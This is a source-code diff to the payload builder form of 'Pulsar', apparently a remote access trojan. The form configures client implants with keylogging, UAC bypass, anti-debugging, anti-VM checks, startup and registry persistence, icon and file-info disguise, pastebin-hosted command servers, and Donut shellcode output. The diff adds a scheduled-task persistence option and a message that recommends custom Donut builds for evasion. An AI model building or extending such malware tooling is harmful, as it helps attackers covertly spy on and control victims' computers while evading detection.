@@ -1,4 +1,4 @@
-using Pulsar.Common.DNS;
+﻿using Pulsar.Common.DNS;
 using Pulsar.Common.Helpers;
 using Pulsar.Server.Build;
 using Pulsar.Server.Forms.DarkMode;
@@ -33,7 +33,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);            
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
 
             txtHost.TextChanged += txtHost_TextChanged;
             txtHost.KeyDown += TxtHost_KeyDown;
@@ -49,7 +49,8 @@ namespace Pulsar.Server.Forms
 
             portNotificationTimer = new System.Windows.Forms.Timer();
             portNotificationTimer.Interval = 3000;
-            portNotificationTimer.Tick += (s, e) => {
+            portNotificationTimer.Tick += (s, e) =>
+            {
                 lblPortNotification.Visible = false;
                 portNotificationTimer.Stop();
             };
@@ -57,11 +58,11 @@ namespace Pulsar.Server.Forms
             portSetDelayTimer = new System.Windows.Forms.Timer();
             portSetDelayTimer.Interval = 1000;
             portSetDelayTimer.Tick += PortSetDelayTimer_Tick;
-            
+
             checkBox1.CheckedChanged += CheckBox1_CheckedChanged;
             chkCryptable.CheckedChanged += ChkCryptable_CheckedChanged;
         }
-        
+
         private void CheckBox1_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
@@ -74,7 +75,7 @@ namespace Pulsar.Server.Forms
             txtTag.Enabled = true;
             txtMutex.Enabled = true;
             connectionPage.Enabled = true;
-            monitoringTab.Enabled = true;
+            //monitoringTab.Enabled = true;
             chkKeylogger.Enabled = true;
             installationPage.Enabled = !cryptable;
             chkInstall.Enabled = !cryptable;
@@ -104,13 +105,14 @@ namespace Pulsar.Server.Forms
             chkUACBypass.Enabled = !cryptable;
             chkAntiDebug.Enabled = !cryptable;
             chkVM.Enabled = !cryptable;
+            checkBox3.Enabled = !cryptable;
 
-            txtLogDirectoryName.Enabled = chkKeylogger.Checked && monitoringTab.Enabled;
-            chkHideLogDirectory.Enabled = chkKeylogger.Checked && monitoringTab.Enabled;
+            //txtLogDirectoryName.Enabled = chkKeylogger.Checked && monitoringTab.Enabled;
+            //chkHideLogDirectory.Enabled = chkKeylogger.Checked && monitoringTab.Enabled;
 
             if (cryptable)
             {
-
+                checkBox3.Checked = false;
                 chkInstall.Checked = false;
                 txtInstallName.Text = string.Empty;
                 rbAppdata.Checked = true;
@@ -144,14 +146,14 @@ namespace Pulsar.Server.Forms
                 }
             }
         }
-        
+
         private void UpdatePastebinUI()
         {
             txtHost.Enabled = !checkBox1.Checked;
             numericUpDownPort.Enabled = !checkBox1.Checked;
             btnAddHost.Enabled = !checkBox1.Checked;
             lstHosts.Enabled = !checkBox1.Checked;
-            
+
             txtPastebin.Enabled = checkBox1.Checked;
         }
 
@@ -268,6 +270,7 @@ namespace Pulsar.Server.Forms
             _hosts.Clear();
             foreach (var host in _hostsConverter.RawHostsToList(profile.Hosts, true))
                 _hosts.Add(host);
+            checkBox3.Checked = profile.EnableScheduledTask;
 
             txtTag.Text = profile.Tag;
             numericUpDownDelay.Value = profile.Delay;
@@ -279,7 +282,7 @@ namespace Pulsar.Server.Forms
             chkHide.Checked = profile.HideFile;
             chkHideSubDirectory.Checked = profile.HideSubDirectory;
             chkStartup.Checked = profile.AddStartup;
-            txtRegistryKeyName.Text = profile.RegistryName;            
+            txtRegistryKeyName.Text = profile.RegistryName;
             chkChangeIcon.Checked = profile.ChangeIcon;
             txtIconPath.Text = profile.IconPath;
             LoadIconPreview(profile.IconPath);
@@ -309,6 +312,7 @@ namespace Pulsar.Server.Forms
         private void SaveProfile(string profileName)
         {
             var profile = new BuilderProfile(profileName);
+            profile.EnableScheduledTask = checkBox3.Checked;
 
             profile.Tag = txtTag.Text;
             profile.Hosts = _hostsConverter.ListToRawHosts(_hosts);
@@ -329,7 +333,7 @@ namespace Pulsar.Server.Forms
             profile.ChangeAsmInfo = chkChangeAsmInfo.Checked;
             profile.Keylogger = chkKeylogger.Checked;
             profile.LogDirectoryName = txtLogDirectoryName.Text;
-            profile.HideLogDirectory = chkHideLogDirectory.Checked;            
+            profile.HideLogDirectory = chkHideLogDirectory.Checked;
             profile.ProductName = txtProductName.Text;
             profile.Description = txtDescription.Text;
             profile.CompanyName = txtCompanyName.Text;
@@ -347,6 +351,7 @@ namespace Pulsar.Server.Forms
 
         private void FrmBuilder_Load(object sender, EventArgs e)
         {
+
             lstHosts.DataSource = new BindingSource(_hosts, null);
             LoadProfile("Default");
 
@@ -364,7 +369,8 @@ namespace Pulsar.Server.Forms
             btnShellcode.Enabled = File.Exists(Path.Combine(Environment.CurrentDirectory, "donut.exe"));
             groupBox1.Visible = File.Exists(Path.Combine(Environment.CurrentDirectory, "donut.exe"));
 
-            comboBox1.SelectedIndex = 0;
+            comboBox1.SelectedIndex = 1;
+            //chkCryptable.Checked = true;
         }
 
         private void FrmBuilder_FormClosing(object sender, FormClosingEventArgs e)
@@ -490,8 +496,8 @@ namespace Pulsar.Server.Forms
         private void chkCriticalProcess_CheckedChanged(object sender, EventArgs e)
         {
             HasChanged();
-        }        
-        
+        }
+
         private void btnBrowseIcon_Click(object sender, EventArgs e)
         {
             using (OpenFileDialog ofd = new OpenFileDialog())
@@ -531,15 +537,16 @@ namespace Pulsar.Server.Forms
                 throw new Exception("Please fill out all required fields!");
             }
 
+            options.ScheduledTask = checkBox3.Checked;
             options.Tag = txtTag.Text;
             options.Mutex = txtMutex.Text;
             if (checkBox1.Checked)
             {
                 options.RawHosts = txtPastebin.Text;
                 options.Pastebin = true;
-                
+
                 // Validate the pastebin URL
-                if (string.IsNullOrWhiteSpace(options.RawHosts) || 
+                if (string.IsNullOrWhiteSpace(options.RawHosts) ||
                     (!options.RawHosts.StartsWith("http://") && !options.RawHosts.StartsWith("https://")))
                 {
                     throw new Exception("Please enter a valid URL for the pastebin. It should start with http:// or https://");
@@ -549,13 +556,13 @@ namespace Pulsar.Server.Forms
             {
                 options.Pastebin = false;
                 options.RawHosts = _hostsConverter.ListToRawHosts(_hosts);
-                
+
                 if (options.RawHosts.Length < 2)
                 {
                     throw new Exception("Please enter a valid host to connect to.");
                 }
             }
-            
+
             options.Delay = (int)numericUpDownDelay.Value;
             options.IconPath = txtIconPath.Text;
             options.Version = ServerVersion.Current;
@@ -574,6 +581,10 @@ namespace Pulsar.Server.Forms
             options.AntiDebug = chkAntiDebug.Checked;
             options.UACBypass = chkUACBypass.Checked;
             options.CRITICALPROCESS = chkCriticalProcess.Checked;
+
+            // ✅ ADD THIS LINE
+            options.ScheduledTask = checkBox3.Checked;
+
 
             if (!File.Exists("client.bin"))
             {
@@ -834,11 +845,12 @@ namespace Pulsar.Server.Forms
             txtOriginalFilename.Enabled = chkChangeAsmInfo.Checked;
             txtFileVersion.Enabled = chkChangeAsmInfo.Checked;
             txtProductVersion.Enabled = chkChangeAsmInfo.Checked;
-        }        private void UpdateIconControlStates()
+        }
+        private void UpdateIconControlStates()
         {
             txtIconPath.Enabled = chkChangeIcon.Checked;
             btnBrowseIcon.Enabled = chkChangeIcon.Checked;
-            
+
             // Clear icon preview when disabled
             if (!chkChangeIcon.Checked)
             {
@@ -854,8 +866,9 @@ namespace Pulsar.Server.Forms
 
         private void UpdateStartupControlStates()
         {
-            txtRegistryKeyName.Enabled = chkStartup.Checked;
+            txtRegistryKeyName.Enabled = chkStartup.Checked || checkBox3.Checked;
         }
+
 
         private void UpdateInstallationControlStates()
         {
@@ -951,7 +964,7 @@ namespace Pulsar.Server.Forms
                         {
                             string tempIconPath = Path.Combine(Path.GetTempPath(), $"{Path.GetFileNameWithoutExtension(ofd.FileName)}_{Guid.NewGuid()}.ico");
                             Icon iconextracted = Icon.ExtractAssociatedIcon(ofd.FileName);
-                            
+
                             Bitmap bitmap = iconextracted.ToBitmap();
 
                             SaveBitmapAsIcon(bitmap, tempIconPath);
@@ -1069,6 +1082,34 @@ namespace Pulsar.Server.Forms
         {
             LoadIconPreview(txtIconPath.Text);
             HasChanged();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show(
+                @"Pulsar uses Donut to convert it's executable into position-independent shellcode.
+
+⚠️ Important: donut.exe must be located in the same folder as this application for the shellcode build process to work.
+
+If you want the latest evasion techniques and mitigations, compile Donut from source and produce a custom build — this ensures you get the newest evasion techniques and any recent fixes that prebuilt releases do not include.
+
+Get the project (source and releases) from: https://github.com/TheWover/donut",
+                "Donut Shellcode Builder Info",
+                MessageBoxButtons.OK,
+                MessageBoxIcon.Information
+            );
+        }
+
+        private void checkBox3_CheckedChanged(object sender, EventArgs e)
+        {
+            HasChanged();
+
+            UpdateStartupControlStates();
+        }
+
+        private void chkCryptable_CheckedChanged_1(object sender, EventArgs e)
+        {
+
         }
     }
 }
